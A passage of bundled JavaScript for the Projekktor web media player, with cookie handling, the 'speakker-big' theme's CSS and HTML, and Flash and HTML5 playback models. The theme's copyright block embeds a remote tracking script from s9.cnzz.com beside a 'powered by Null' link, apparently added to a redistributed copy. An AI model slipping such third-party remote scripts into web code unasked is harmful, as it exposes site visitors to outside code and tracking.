	    t.setDate(t.getDate() + (this.pp.getConfig('cookieExpiry') || 0));
	    return (document.cookie =
		encodeURIComponent(this.pp.getConfig('cookieName')+this.name+"_"+key)+'='
		+encodeURIComponent(value)
		+'; expires=' + ((del===true) ? "Thu, 01 Jan 1970 00:00:01 GMT" : t.toUTCString())
		+'; path=/'
		// +options.domain ? '; domain=' + options.domain : '',?		// +options.secure ? '; secure' : ''
	    );
	}

	// get cookie data:
	var result,
	    returnthis = (result = new RegExp('(?:^|; )' + encodeURIComponent(this.pp.getConfig('cookieName')+this.name+"_"+key) + '=([^;]*)').exec(document.cookie)) ? decodeURIComponent(result[1]) : null;

	return (returnthis=='true' || returnthis=='false') ? eval(returnthis) : returnthis;
    },
    
    // important
    eventHandler: function() {}
}
});
projekktorConfig.prototype =  {"_playerName":"Projekktor","_playerHome":"http:\/\/www.projekktor.com","_cookieName":"speakker","_cookieExpiry":356,"_plugins":["Display","Controlbar","Share","Schedule"],"_addplugins":[],"_reelParser":null,"_ns":"pp","_platforms":["browser","android","ios","native","flash"],"_iframe":false,"_ignoreAttributes":true,"_loop":false,"_autoplay":false,"_continuous":true,"_thereCanBeOnlyOne":true,"_playlist":[],"_theme":{"id":"speakker-big","baseURL":"http:\/\/addons.projekktorxl.com\/themes\/audio\/speakker-big","css":".speakker *, .mspeakker * {border: 0 none;margin: 0;padding: 0;z-index: 8000;}.dark .skControls {background-color:#212121}.dark .skBiglayer {background-color:#252525}.dark .skLeftBlock,.dark .skMiddleBlock,.dark .skSocial {border-color:#000;}.dark .skVolume,.dark .skScrubbler {border:1px solid #151515}.dark .skVolume,.dark .skScrubbler {background-color:#000;}.dark .skLoad {background-color:#2E2E2E;}.dark .skTimeRemain,.dark .skVolumeRemain {background-color:#9CA4BE}.dark,.dark a {color:#fcfcfc;font-weight:bold;}.dark a:hover {color:#b52b09}.dark {text-shadow: 1px 1px 1px #111;}.dark .skArtistlist .active {color:#5d5c5c}.dark .jspDrag {background-color:#171717;}.dark .jspDrag:hover {background-color:#090909;}.light .skControls {background-color:#E1E1E1}.light .skBiglayer {background-color:#EBEBEB}.light .skLeftBlock,.light .skMiddleBlock,.light .skSocial {border-color:#000;}.light .skVolume,.light .skScrubbler {border:1px solid #CACACA}.light .skVolume,.light .skScrubbler {background-color:#fff;}.light .skLoad {background-color:#A41F35;}.light .skTimeRemain,.light .skVolumeRemain {background-color:#9CA4BE}.light,.light a {color:#000;font-weight:bold;}.light a:hover {color:#b52b09}.light {text-shadow: 0px 1px 0px #b9b2ba;}.light .skArtistlist .active {color:#333}.light .jspDrag {background-color:#B0B0B0;}.light .jspDrag:hover {background-color:#090909;}.speakker.fat{width:970px;} .speakker.fat .skActControl,.speakker.fat .skScrubbler{width:558px;} .speakker.fat.skMiddleBlock,.speakker.fatul.skArtistlist{width:692px;} .speakker li,.speakker span, .speakker strong {background: transparent;border: 0 none;font-size: 100%;margin: 0;padding: 0;vertical-align: baseline;}.speakker {font-size:11px;font-family:\"Century Gothic\", \"Apple Gothic\", \"Gill Sans\", Tahoma, sans-serif;width:790px;position: fixed;bottom:0;margin:0 auto;display: none;}.speakker a {outline:none;}.ppsocialbar {display: none;}.skControls {background-position:left top;background-repeat:repeat-x;text-align:left;border-bottom:1px solid #000;-moz-border-radius-topleft: 10px;-moz-border-radius-topright: 10px;-webkit-border-top-left-radius: 10px;-webkit-border-top-right-radius: 10px;border-top-left-radius: 10px;border-top-right-radius: 10px;margin:0 auto;height:62px;}.skBiglayer {background-position:top left;background-repeat:repeat-y;margin:0 auto;height:218px;position:relative;display: none;}.skCopyright {background:#252525 url('%{rp}\/img\/sk-copyright.png') right bottom repeat-x;border-top:1px solid #030303;width:100%;height: 25px;position:absolute;bottom:0;left:0;margin:0;padding:0;}.skLeftBlock {position:relative;background-repeat:repeat;background-position:left bottom;float:left;width:94px;padding:17px;height:158px;border-style:solid;border-right-width:1px;z-index:0;}.skMiddleBlock {background-repeat:repeat;background-position:left bottom;float:left;width:522px;height:158px;padding:17px;border-style:solid;border-right-width:1px;overflow: hidden;position: relative;}.skRightBlock {background-repeat:repeat;background-position:right bottom;float:left;position:relative;width:104px;height:192px;text-align:center;}.skMainControl,.skActControl {float:left;position:relative;height:33px;}.skMainControl {padding:17px 32px 12px 17px;width:97px;}.skActControl {width:385px;padding:15px 0px 14px;}.skModuleControl {width:85px;padding:17px 17px 12px 17px;float:right;height:33px;}.skVolumeControl {float:left;position:relative;width:108px;height:33px;padding:17px 0px 12px 29px;}.skOpener,.skCloser,.skLoud {float:right;cursor:pointer;}.skPlay, .skPause {margin:0 12px;}.skHeart,.skPlay,.skPause,.skForwards,.skBackwards,.skMute,.skLoop {float:left;cursor:pointer;}.skHeart,.skPlay,.skPause,.skForwards,.skBackwards,.skLoop {display: block;}.skPause.inactive,.skPlay.inactive,.pplogo.inactive {display: none;}.skForwards.inactive,.skBackwards.inactive,.skLoop.inactive{-moz-opacity:.20;filter:alpha(opacity=20);opacity:.20;display: block;}.active {display: block;-moz-opacity:1;filter:alpha(opacity=100);opacity:1.00;}.skHeart {background:transparent url('%{rp}\/img\/sk-heart.png') left top no-repeat;width:18px;height:25px;}a.skEdit,a.skDownloadSingle,a.skUrl {background:transparent url('%{rp}\/img\/sk-edit.png') right 4px no-repeat;text-transform:uppercase;text-decoration:none;float:left;font-size:10px;margin:6px 0 0 17px;padding-right:17px;}a.skDownloadSingle {background:transparent url('%{rp}\/img\/sk-edit.png') center center no-repeat;margin: 0;float: right;margin: 7px 0 0 17px;width: 20px;height: 7px;}a.skEdit,a.skUrl {color:#fcfcfc;text-shadow: 1px 1px 1px #111;font-weight:normal;}a.skEdit:hover,a.skUrl:hover {color:#b52b09;}a.skUrl {color:#5d5c5c;background:none;padding-right:0px;margin:6px 17px 0 0;float:right;}.skWiki,.skArtistlist {list-style-type: none;margin-top:12px;}.skWiki a.lastfm {background:transparent url('%{rp}\/img\/sk-lastfm.png') right 2px no-repeat;padding-right:24px;}.skWiki a {text-decoration:none;line-height:24px;}.skArtistlist a {text-decoration:none;}.skArtistlist li {height: 24px;cursor: pointer;}.skArtistlistli:hover {color:#b52b09}.skArtistlist {width:520px;height: 170px;margin:0;padding:0;overflow: hidden;}.skAct {width:260px;float:left;padding:0;line-height:24px;height:24px;overflow:hidden;}.skTime {width:80px;float:right;line-height:24px;text-align:right;}.skScrubbler {width:385px;float:none;height:2px;position:absolute;left:0;bottom:15px;z-index:3;cursor: pointer;}.skLoad {float:none;height:2px;position:absolute;bottom:16px;left:1px;z-index:4;}.ppscrubberdrag {cursor: pointer;z-index: 15;position: absolute;background-color: transparent;bottom:16px;left:1px;z-index:10;height: 2px;width: 100%;}.skTimeRemain {float:none;height:2px;position:absolute;bottom:16px;left:1px;z-index:5;}.skVolumeWidth {width:48px;position: absolute;left:57px;bottom:15px;float:none;}.skVolume {width:100%;height:2px;position:absolute;left:0;bottom:12px;z-index:6;}.skVolumeRemain {float:none;height:2px;position:absolute;bottom:13px;left:1px;z-index:7;cursor:pointer;}.skLabel {background:transparent url('%{rp}\/img\/sk-label.png') left top no-repeat;width:94px;height:75px;position:absolute;top:17px;left:17px;z-index:8;}.skSocial {width:70px;border-style:solid;border-bottom-width:1px;padding:17px;float:left;}.skFacebook,.skTwitter {display:bock;float:left;text-indent:-99999px;}.skTwitter {margin-left:12px;}.skDownload {position:absolute;top:148px;left:17px;text-indent:-99999px;}.skCover {background:transparent url('%{rp}\/img\/sk-nocover.png') left top no-repeat;width:72px;height:72px;position:relative;overflow:hidden;}.light .skBackwards,.light .skForwards,.light .skOpener,.light .skCloser,.light .skDownload,.light .skFacebook,.light .skTwitter,.light .skLoop,.light .skLoud,.light .skMute,.light .skPlay,.light .skPause,.light .jspArrow.jspArrowUp.jspDisabled,.light .jspArrow.jspArrowUp,.light .scrollbar-handle-up ,.light .scrollbar-handle-down{background-image: url('%{rp}\/img\/light\/sk-light.png') ;}.light .skLeftBlock {background-image: url('%{rp}\/img\/light\/sk-leftblock.png') ;}.light .skMiddleBlock {background-image: url('%{rp}\/img\/light\/sk-middleblock.png') ;}.light .skRightBlock {background-image: url('%{rp}\/img\/light\/sk-rightblock.png') ;}.light .skControls {background-image:url('%{rp}\/img\/light\/sk-controlbg.png') ;}.dark .skBackwards,.dark .skForwards,.dark .skOpener,.dark .skCloser,.dark .skDownload,.dark .skFacebook,.dark .skTwitter,.dark .skLoop,.dark .skLoud,.dark .skMute,.dark .skPlay,.dark .skPause,.dark .scrollbar-handle-up,.dark .scrollbar-handle-down {background-image: url('%{rp}\/img\/dark\/sk-dark.png') ;}.dark .skLeftBlock {background-image: url('%{rp}\/img\/dark\/sk-leftblock.png') ;}.dark .skMiddleBlock {background-image: url('%{rp}\/img\/dark\/sk-middleblock.png') ;}.dark .skRightBlock {background-image: url('%{rp}\/img\/dark\/sk-rightblock.png') ;}.dark .skControls {background-image:url('%{rp}\/img\/dark\/sk-controlbg.png') ;}.skBackwards {background-position:0 0;height: 32px;width: 20px;}.skBackwards:hover {background-position:0 -32px;}.skForwards {background-position:0 -64px;height: 32px;width: 20px;}.skForwards:hover {background-position:0 -96px;}.skCloser {display: none;background-position:-24px 0;height: 28px;width: 26px;}.skCloser:hover {background-position:-24px -29px;}.skDownload {background-position:-50px 0;height: 32px;width: 67px;}.skDownload:hover {background-position:-50px -32px;}.skFacebook {background-position:-50px -64px;height: 33px;width: 28px;}.skFacebook:hover {background-position:-50px -98px;}.skTwitter {background-position:-78px -64px;height: 33px;width: 28px;}.skTwitter:hover {background-position:-78px -98px;}.skLoop {background-position:-24px -57px;height: 32px;width: 26px;}.skLoop:hover {background-position:-24px -89px;}.skLoud {background-position:-24px -120px;height: 32px;width: 26px;}.skLoud:hover {background-position:-24px -152px;}.skMute {background-position:-24px -184px;height: 32px;width: 26px;}.skMute:hover {background-position:-24px -216px;}.skOpener {background-position:-24px -248px;height: 28px;width: 26px;}.skOpener:hover {background-position:-24px -278px;}.skPause {background-position:-50px -132px;height: 34px;width: 32px;}.skPause:hover {background-position:-50px -167px;}.skPlay {background-position:-82px -132px;height: 34px;width: 32px;}.skPlay:hover {background-position:-82px -168px;}.scrollbar-handle-up.jspDisabled,.scrollbar-handle-up.jspDisabled:hover{background-position:0 -128px;height: 16px;width: 16px;}.scrollbar-handle-down {background-position:0 -144px;height: 16px;width: 16px;}.scrollbar-handle-down:hover {background-position:0 -160px;}.scrollbar-handle-up.jspDisabled,.scrollbar-handle-up.jspDisabled:hover {background-position:0 -176px;height: 16px;width: 16px;}.scrollbar-handle-up{background-position:0 -192px;height: 16px;width: 16px;}.scrollbar-handle-up:hover {background-position:0 -208px;height: 16px;width: 16px;}.scrollbar-pane {margin-right: 16px;}.scrollbar-handle-container {background: transparent;width: 15px;} .scrollbar-handle:hover {background-color:#090909;}.scrollbar-handle {cursor: pointer;width:15px;-moz-border-radius: 100px;-webkit-border-radius: 10px;border-radius: 10px;background-color:#171717;}","html":"<div class=\"skControls\"> <div class=\"skMainControl\"> <div class=\"skBackwards ppprev\"><\/div> <div class=\"skPlay ppplay\"><\/div> <div class=\"skPause pppause\"><\/div> <div class=\"skForwards ppnext\"><\/div> <\/div> <div class=\"skActControl\"> <div class=\"skAct pptitle\"><\/div> <div class=\"skTime\"> <span class=\"ppmin_dur\"><\/span>:<span class=\"ppsec_dur\"><\/span> | <span class=\"ppmin_rem\"><\/span>:<span class=\"ppsec_rem\"><\/span> <\/div> <div class=\"skScrubbler ppscrubber\"><\/div> <div class=\"skLoad pploaded\"><\/div> <div class=\"skTimeRemain ppplayhead\"><\/div> <div class=\"ppscrubberdrag\"><\/div> <\/div> <div class=\"skVolumeControl\"> <div class=\"skMute ppmute\"><\/div> <div class=\"skVolumeWidth ppvslider\"> <div class=\"skVolume\"><\/div> <div class=\"skVolumeRemain ppvmarker\"><\/div> <\/div> <div class=\"skLoud ppvmax\"><\/div> <\/div> <div class=\"skModuleControl\"> <div class=\"skLoop pploop\"><\/div> <div class=\"skOpener ppopen toggleskBiglayer\"><\/div> <div class=\"skCloser ppclose toggleskBiglayer\"><\/div> <\/div> <\/div> <div class=\"skBiglayer\"> <div class=\"skLeftBlock\"> <div class=\"skLabel\"><\/div> <div class=\"skCover ppdisplay\"><\/div><\/div> <div class=\"skMiddleBlock\"> <ul class=\"skArtistlist ppschedule\"><\/ul> <\/div> <div class=\"skRightBlock\"><\/div><p class=\"skCopyright\"> <script src=\"http:\/\/s9.cnzz.com\/stat.php\?id=5396499&web\_id=5396499&online=1\&show=line\" language=\"JavaScript\"><\/script><a class=\"skUrl\" href=\"http:\/\/www.nullblogs.com\" target=\"_blank\">powered by Null<\/a> <\/p> <\/div> ","onReady":"var bigPlayer=player.env.playerDom,w=$(document).width(),tw=bigPlayer.width();bigPlayer.css(\"right\",(w-tw>0?((w\/2)-(tw\/2))+\"px\":0));if(player.getIsMobileClient()){if(\/OS [1-4]_\\d like Mac OS X\/i.test(navigator.userAgent)){bigPlayer.css(\"position\",\"static\")}player.addListener(\"resize\",function(){$(\"html, body\").scrollTop($(\"body\").height())});$(window).unbind()}function clearLinks(b){var a=player.getConfig(\"plugin_share\").links,c=player.getCssPrefix()+\"shareicn_\";b.find(\".\"+player.getCssPrefix()+\"shareicn\").hide();$.each(a,function(d,e){if(e.code!=false||e.code!=\"false\"||e.code!=\"\"){b.find(\".\"+c+d).show()}})}clearLinks(player.getDC());player.getDC().fadeIn(\"fast\");"},"_themeRepo":false,"_messages":{"0":"An error occurred.","1":"You aborted the media playback. ","2":"A network error caused the media download to fail part-way. ","3":"The media playback was aborted due to a corruption problem. ","4":"The media (%{title}) could not be loaded because the server or network failed.","5":"Sorry, your browser does not support the media format of the requested file.","6":"Your client is in lack of the Flash Plugin V%{flashver} or higher.","7":"No media scheduled.","8":"! Invalid media model configured !","9":"File (%{file}) not found.","10":"Invalid or missing quality settings for %{title}.","11":"Invalid streamType and\/or streamServer settings for %{title}.","12":"Invalid or inconsistent quality setup for %{title}.","80":"The requested file does not exist or is delivered with an invalid content-type.","97":"No media scheduled.","98":"Invalid or malformed playlist data!","99":"Click display to proceed. ","100":"Keyboard Shortcuts","500":"This Youtube video has been removed or set to private","501":"The Youtube user owning this video disabled embedding.","502":"Invalid Youtube Video-Id specified."},"_debug":false,"_width":false,"_height":false,"_ratio":false,"_keys":[],"_isCrossDomain":false,"_forceFullViewport":false,"ID":0,"title":null,"cat":"clip","poster":false,"controls":true,"start":false,"stop":false,"volume":0.5,"cover":"","disablePause":false,"disallowSkip":false,"fixedVolume":false,"imageScaling":"aspectratio","videoScaling":"aspectratio","playerFlashMP4":"jarisplayer.swf","playerFlashMP3":"jarisplayer.swf","streamType":"http","streamServer":"","startParameter":"start","useYTIframeAPI":true,"enableKeyboard":true,"enableFullscreen":false,"playbackQuality":"default","_playbackQualities":[{"key":"small","minHeight":240,"minWidth":240},{"key":"medium","minHeight":360,"minWidth":[{"ratio":1.77,"minWidth":640},{"ratio":1.33,"minWidth":480}]},{"key":"large","minHeight":480,"minWidth":[{"ratio":1.77,"minWidth":853},{"ratio":1.33,"minWidth":640}]},{"key":"hd1080","minHeight":1080,"minWidth":[{"ratio":1.77,"minWidth":1920},{"ratio":1.33,"minWidth":1440}]},{"key":"hd720","minHeight":720,"minWidth":[{"ratio":1.77,"minWidth":1280},{"ratio":1.33,"minWidth":960}]},{"key":"highres","minHeight":1081,"minWidth":0}]};

jQuery(function($) {
$p.newModel({

    modelId: 'VIDEOFLASH',
    flashVersion: 9,
    iLove: [
	{ext:'flv', type:'video/flv', platform:'flash', streamType: ['http', 'pseudo', 'rtmp'],fixed: true},
	{ext:'mp4', type:'video/mp4',  platform:'flash', streamType: ['http','pseudo',  'rtmp'],fixed: 'maybe'},
	{ext:'mov', type:'video/quicktime', streamType: ['http', 'pseudo', 'rtmp'], platform:'flash'},
	{ext:'m4v', type:'video/mp4', platform:'flash', streamType: ['http', 'pseudo', 'rtmp'], fixed: 'maybe'},
        {ext:'f4m', type:'video/abst', platform:'flash', streamType: ['httpVideoLive']}
    ],
    
    _eventMap: {
        onprogress:             "progressListener",
        ontimeupdate:           "timeListener",
        ondatainitialized:      "metaDataListener",
        onconnectionsuccess:    "startListener",
        onplaypause:            "_playpauseListener",
        onplaybackfinished:     "endedListener",
        onmute:                 "volumeListener",
        onvolumechange:         "volumeListener",
        onbuffering:            "waitingListener",
        onnotbuffering:         "canplayListener",
        onconnectionfailed:     "errorListener"                        
    },        
    
    isPseudoStream: false,
    allowRandomSeek: false,
    flashVerifyMethod: 'api_source',
    _jarisVolume: 0,
    
    applyMedia: function(destContainer) {

        var domOptions = {
            id: this.pp.getMediaId()+"_flash",
            name: this.pp.getMediaId()+"_flash",
            src: this.pp.getConfig('playerFlashMP4'),
            width: '100%',
            height: '100%',
            allowScriptAccess:"always",
	    allowFullScreen: 'false',
	    allowNetworking: "all",	    
            wmode: ($p.utils.ieVersion()) ? 'transparent' : 'opaque',
	    bgcolor: '#000000',
            FlashVars: {		
		type: "video",
		streamtype: (this.pp.getConfig('streamType')!='rtmp') ? 'file' : 'rtmp',
		server: (this.pp.getConfig('streamType')=='rtmp') ? this.pp.getConfig('streamServer') : '',
		autostart: "false",
		controls: 'false',		
		aspectratio: this.pp.getConfig('videoScaling')
	    }
        };

	switch(this.pp.getConfig('streamType')) {
	    case 'rtmp':
		this.allowRandomSeek = true;
		this.media.loadProgress = 100;
                break;
            case 'pseudo':             
                this.isPseudoStream = true;
                this.allowRandomSeek = true;
                this.media.loadProgress = 100;
		break;
	}
	
	this.createFlash(domOptions, destContainer);      
    },

    applySrc: function() {

	var ref = this,
            sources = this.getSource();

        this.mediaElement.api_source(sources[0].src);
        
        this.seekedListener();            

        if (this.getState('PLAYING')) {
            this.setPlay();
            if (ref.isPseudoStream!==true)
                this.setSeek(this.media.position || 0);
        }
    },

    
    /*****************************************
     * Handle Events
     ****************************************/ 
    addListeners: function() {
        if (this.mediaElement==null) return;        
        var ref = this;       
        $.each(this._eventMap, function(key, value){
            ref.mediaElement.api_addlistener(key, "projekktor('"+ref.pp.getId()+"').playerModel." + value);
        });       
    },

    removeListeners: function() {
        try {this.mediaElement.api_removelistener("*");} catch(e){}; 
    },   
    
    flashReadyListener: function() {        
	this.applySrc();
        this.displayReady();
    },        
    
    /* needs a more sophisticated error repoprting */
    errorListener: function(event) {         
        this.setTestcard(4);
    },
    
    /* "volume change event flood" workaround - fix this within jarisplayer! */ 
    volumeListener: function(obj) {
	if (this._jarisVolume!=obj.volume) {	    
	    this._jarisVolume=obj.volume;
	    this.sendUpdate('volume', obj.volume);
	}
    },
        
      
    /* wrapping non-status-based jaris behavior */
    _playpauseListener: function(obj) {
	if (obj.isplaying) {
            // jaris player workaround for pause/seek/reset issue
            if (this.getModelName().indexOf('AUDIO')>-1) {
                this.setSeek(this.media.position);
            }
	    this.playingListener();
	}
	else {
	    this.pauseListener();
	}
    },
    
    metaDataListener: function(obj) {
        
	this.applyCommand('volume', this.pp.getConfig('volume'));
        
	try {this.mediaElement.api_seek(this.media.position || 0);} catch(e){}; 
	this._setState('playing'); 
	
        if (this.modelId.indexOf('AUDIO')>-1) {
            this.mediaElement.api_removelistener('ondatainitialized');
            return;
        }
        
        try {
	    this.videoWidth = obj.width;
	    this.videoHeight = obj.height;
	    // the flash component scales the media by itself
	    this.sendUpdate('scaled', {width: this.videoWidth, height:this.videoHeight});
	} catch(e) {};	

    },
    
    startListener: function(obj) {
	this.applyCommand('volume', this.pp.getConfig('volume'));	
	try {this.mediaElement.api_seek(this.media.position || 0);} catch(e){}; 
	this._setState('playing'); 
    },      
     
    
    /*****************************************
     * Setters
     ****************************************/       
    setSeek: function(newpos) {
        if (this.isPseudoStream) {
            this.media.offset = newpos;
            this.timeListener({position:0});    
            this.applySrc();
        } else {        
            try {this.mediaElement.api_seek(newpos);} catch(e){};
            this.seekedListener();            
            this.timeListener({position:newpos});    
        }
    },

    setVolume: function(newvol) {
	this._volume = newvol;
	try {this.mediaElement.api_volume(newvol);} catch(e){return false;}
	return newvol;
    },    
    
    setPause: function(event) {
	try {this.mediaElement.api_pause();} catch(e){};
    },      
    
    setPlay: function(event) {
        try {this.mediaElement.api_play();} catch(e){};
    },
                
    getVolume: function() {    
	return this._jarisVolume;
    },

    detachMedia: function() {
        this.setPause();
        try{$(this.mediaElement).remove();} catch(e){}           
    }
});

$p.newModel({    

    modelId: 'AUDIOFLASH',
    iLove: [
	{ext:'mp3', type:'audio/mp3', platform:'flash', streamType: ['http']},
	{ext:'mp3', type:'audio/mpeg', platform:'flash', streamType: ['http']},
	{ext:'m4a', type:'audio/mp4', platform:'flash', streamType: ['http']}
    ],
    
    applyMedia: function(destContainer) {
	
        $p.utils.blockSelection(destContainer)        
	
        // create image element
	this.imageElement = this.applyImage(this.pp.getConfig('cover') || this.pp.getConfig('poster'), destContainer);
        
	var flashContainer = $('#'+this.pp.getMediaId()+'_flash_container')
	if (flashContainer.length==0) {
	    flashContainer = $(document.createElement('div'))
		.css({width: '1px', height: '1px'})
		.attr('id', this.pp.getMediaId()+"_flash_container")
		.prependTo( this.pp.getDC() );	    
	}

	var domOptions = {
	    id: this.pp.getMediaId()+"_flash",
	    name: this.pp.getMediaId()+"_flash",
	    src: this.pp.getConfig('playerFlashMP3'),
	    width: '1px',
	    height: '1px',
	    allowScriptAccess:"always",
	    allowFullScreen: 'false',
	    allowNetworking: "all",	    
	    wmode: 'transparent',
	    bgcolor: '#000000',
	    FlashVars: {
		type: "audio",
		streamtype: 'file', 
		server: '',
		autostart: "false",
		hardwarescaling: "false",
		controls: 'false',
		jsapi: 'true'
	     }
	 };
	
	this.createFlash(domOptions, flashContainer, false);      
    }
    
}, 'VIDEOFLASH');

});
/*
 * this file is part of: 
 * projekktor zwei
 * 
 *
 * Copyright 2010, Sascha Kluger, Spinning Airwhale Media, http://www.spinningairwhale.com
 * under GNU General Public License
 * http://www.filenew.org/projekktor/license/
*/
jQuery(function($) {
$p.newModel({
    
    modelId: 'VIDEO',
    androidVersion: 2,
    iosVersion: 3,
    nativeVersion: 0,
    iLove: [
	{ext:'mp4', type:'video/mp4', platform:['ios', 'android', 'native'], streamType: ['http', 'pseudo', 'httpVideo'], fixed: 'maybe'},
        {ext:'ogv', type:'video/ogg', platform:'native', streamType: ['http', 'httpVideo']},	
	{ext:'webm',type:'video/webm', platform:'native', streamType: ['http', 'httpVideo']},
	{ext:'ogg', type:'video/ogg', platform:'native', streamType: ['http', 'httpVideo']},
	{ext:'anx', type:'video/ogg', platform:'native', streamType: ['http', 'httpVideo']}
    ],
    
    _eventMap: {
        pause:          "pauseListener",
        play:           "playingListener",
        volumechange:   "volumeListener",
        progress:       "progressListener",
        timeupdate:     "timeListener",
        ended:          "_ended",
        waiting:        "waitingListener",
        canplaythrough: "canplayListener",
        canplay:        "canplayListener",
        error:          "errorListener",
        suspend:        "suspendListener",
        seeked:         "seekedListener",
        loadedmetadata: "metaDataListener",
        loadstart:      null        
    },    
    
    allowRandomSeek: false,
    videoWidth: 0,
    videoHeight: 0,
    wasPersistent: true,
    isPseudoStream: false,
      
    applyMedia: function(destContainer) {

	if ($('#'+this.pp.getMediaId()+"_html").length==0) {
	    this.wasPersistent = false;
	    destContainer.html('').append(
		$('<video/>')
		.attr({
		    "id": this.pp.getMediaId()+"_html",         
		    "poster": (this.pp.getIsMobileClient('ANDROID')) ? this.getPoster() : $p.utils.imageDummy(),
		    "loop": false,
		    "autoplay": false,
		    "x-webkit-airplay": "allow"
		}).prop({
		    controls: false,
		    volume: this.getVolume()
		}).css({
		    'width': '100%',
		    'height': '100%',
		    'position': 'absolute',
		    'top': 0,
		    'left': 0
		})
	    );
	}

	this.mediaElement = $('#'+this.pp.getMediaId()+"_html");
	this.applySrc();
    },
    
    applySrc: function() {
	var ref = this,
	    wasPlaying = ref.getState('PLAYING'),
            wasAwakening = ref.getState('AWAKENING');

        this.removeListener('error');
        this.removeListener('play');
        this.removeListener('loadstart');
        this.removeListener('canplay');           

	this.mediaElement.find('source').remove();

	$.each(this.getSource(), function() {
	    $('<source/>').appendTo(ref.mediaElement).attr({
		src: this.src,
		type: this.type
	    })
            
	})
 
        var func = function(){

            ref.mediaElement.unbind('loadstart.projekktorqs'+ref.pp.getId());
            ref.mediaElement.unbind('loadeddata.projekktorqs'+ref.pp.getId());
            ref.mediaElement.unbind('canplay.projekktorqs'+ref.pp.getId());
            
            ref.addListeners('error');
            ref.addListeners('play');
            ref.addListeners('loadstart');
            ref.addListeners('canplay');                   

            ref.mediaElement = $('#'+ref.pp.getMediaId()+"_html");            

            if (wasAwakening) {
                ref.displayReady();
                return;
            }

            if (ref.getState('SEEKING')) {
                if (ref._isPlaying)
                    ref.setPlay();
                
                ref.seekedListener();
                return;
            }
            
            if (!ref.isPseudoStream)
                ref.setSeek(ref.media.position || 0);

            if (ref._isPlaying)
                ref.setPlay();
                
	};

        this.mediaElement.bind('loadstart.projekktorqs'+this.pp.getId(), func);
        this.mediaElement.bind('loadeddata.projekktorqs'+this.pp.getId(), func);
        this.mediaElement.bind('canplay.projekktorqs'+this.pp.getId(), func);
        
        this.mediaElement.get(0).load();
        
        func();
        
        // F*CK!!!!
        var ua = navigator.userAgent;
        if( ua.indexOf("Android") >= 0 )
        {
          if (parseFloat(ua.slice(ua.indexOf("Android")+8)) < 3)
          {
            func();
          }
        }        


    },
    
    detachMedia: function() {
	try {
            this.mediaElement[0].pause(); 
            this.mediaElement.find('source').remove(); 
            this.mediaElement.load();
        } catch(e){}
    },
        

    
    /*****************************************
     * Handle Events
     ****************************************/ 
    addListeners: function(evtId, subId) {

        if (this.mediaElement==null) return;
        
        var id = (subId!=null) ? '.projekktor'+subId+this.pp.getId() : '.projekktor'+this.pp.getId(),
            ref = this,
            evt = (evtId==null) ? '*' : evtId;

        $.each(this._eventMap, function(key, value){
            if ((key==evt || evt=='*') && value!=null) {
                ref.mediaElement.bind(key + id, function(evt) {ref[value](this, evt)});
            }
        });       
    },

    removeListener: function(evt, subId) {        
        if (this.mediaElement==null) return;
        
        var id = (subId!=null) ? '.projekktor'+subId+this.pp.getId() : '.projekktor'+this.pp.getId(),
            ref = this;

        $.each(this._eventMap, function(key, value){
            if (key==evt) {
                ref.mediaElement.unbind(key + id);
            }
        });              
    },
    
    _ended: function() {
       
	var dur = this.mediaElement[0].duration, // strange android behavior workaround
            complete = (Math.round(this.media.position) === Math.round(dur)),
	    fixedEnd = ( (dur-this.media.maxpos) < 2 ) && (this.media.position===0) || false;
	if (complete || fixedEnd || this.isPseudoStream) {                   
	    this.endedListener(this);
	} else {	    
	   this.pauseListener(this);
	}
    },
    
    playingListener: function(obj) {
        var ref = this;

        (function() {
            try{
                
                if(ref.mediaElement[0].currentSrc!='' && ref.mediaElement[0].networkState==ref.mediaElement[0].NETWORK_NO_SOURCE && ref.getDuration()==0) {
		    ref.setTestcard(80);
		    return;
		}
                
                if (ref.getDuration()==0) {
                    setTimeout(arguments.callee, 500);
                    return;
                }
         
            } catch(e) {}
        })();

	this._setState('playing'); 
    },      
    
    
    errorListener: function(obj, evt) {
	try {
	    switch (event.target.error.code) {
		case event.target.error.MEDIA_ERR_ABORTED:
		this.setTestcard(1);
		break;
	    case event.target.error.MEDIA_ERR_NETWORK:
		this.setTestcard(2);
		break;
	    case event.target.error.MEDIA_ERR_DECODE:
		this.setTestcard(3);
		break;
	    case event.target.error.MEDIA_ERR_SRC_NOT_SUPPORTED:
		this.setTestcard(4);
		break;
	    default:
		this.setTestcard(5);
		break;
	    }
	} catch(e) {}
    },
      
    canplayListener: function(obj) {
	var ref = this;
        // pseudo streaming
        if (this.pp.getConfig('streamType')=='pseudo') {            
            $.each(this.media.file, function() {
                if (this.src.indexOf(ref.mediaElement[0].currentSrc)>-1) {
                    if (this.type=='video/mp4') {
                        ref.isPseudoStream = true;
                        ref.allowRandomSeek = true;
                        ref.media.loadProgress = 100;
                        return false;
                    }
                }
            })
        }
        
        this._setBufferState('full');
    },

    
    /*****************************************
     * Setters
     ****************************************/     
    setPlay: function() {
	try{this.mediaElement[0].play();} catch(e){}
    },
    
    setPause: function() {	
        try {this.mediaElement[0].pause();} catch(e){}
    },   
            
    setVolume: function(volume) {
	this._volume = volume;
        try {
	    this.mediaElement.prop('volume', volume);
	} catch(e){
	    return false;
	}
	return volume;
    }, 
     
    setSeek: function(newpos) {
        
        if (this.isPseudoStream) {
            this.media.position = 0;
            this.media.offset = newpos;
            this.timeListener();
            this.applySrc();
            return;
        }
        var ref = this;
        
        // IE9 somtimes raises INDEX_SIZE_ERR
        (function() {
            try {
                ref.mediaElement[0].currentTime = newpos;
                ref.timeListener({position: newpos});
            } catch(e){
                if (ref.mediaElement!=null)
                    setTimeout(arguments.callee,100);    
            }
        
        })();	
        
    },           

    setFullscreen: function(inFullscreen) {
	if (this.element=='audio') return;
	this._scaleVideo();
    }, 

    setResize: function() {
	if (this.element=='audio') return;
	this._scaleVideo(false);
    }
    
});

$p.newModel({
    
    modelId: 'AUDIO',
    
    iLove: [
	{ext:'ogg', type:'audio/ogg', platform:'native', streamType: ['http', 'httpAudio']},
	{ext:'oga', type:'audio/ogg', platform:'native', streamType: ['http', 'httpAudio']},
	{ext:'mp3', type:'audio/mp3', platform:['ios', 'android', 'native'], streamType: ['http', 'httpAudio']},
        {ext:'mp3', type:'audio/mpeg', platform:['ios', 'android', 'native'], streamType: ['http', 'httpAudio']}        
    ],
        
    imageElement: {},
    
    applyMedia: function(destContainer) {
        
	var ref = this;
        
        $p.utils.blockSelection(destContainer)
        
        // create cover image
	this.imageElement = this.applyImage(this.pp.getConfig('cover') || this.pp.getConfig('poster'), destContainer);
        this.imageElement.css({border: '0px'})
        
